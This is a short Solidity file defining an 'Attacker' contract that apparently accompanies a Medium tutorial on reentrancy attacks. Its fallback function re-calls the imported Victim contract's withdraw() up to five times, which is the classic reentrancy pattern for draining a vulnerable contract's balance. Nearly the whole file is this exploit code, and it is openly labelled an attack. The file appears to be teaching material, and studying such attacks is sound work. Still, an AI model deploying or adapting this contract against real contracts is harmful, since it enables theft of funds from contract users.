pragma solidity ^0.5.0;
//NOT COMPILED
//devon@nuclo.io
//https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2
import './Victim.sol';
contract  Attacker{
   Victim  public v;
   uint public  count;
   event LogFallback(uint c, uint balance);
   
   
   constructor (address victim) public {
      count =0;
      v=Victim(victim);
   }
  

   function attack() public {
      v.withdraw();
   }

   function () external payable{
      count++;
      emit LogFallback(count, address(this).balance);
      if(count < 5 ) {
         v.withdraw();
      }
    }
}
    
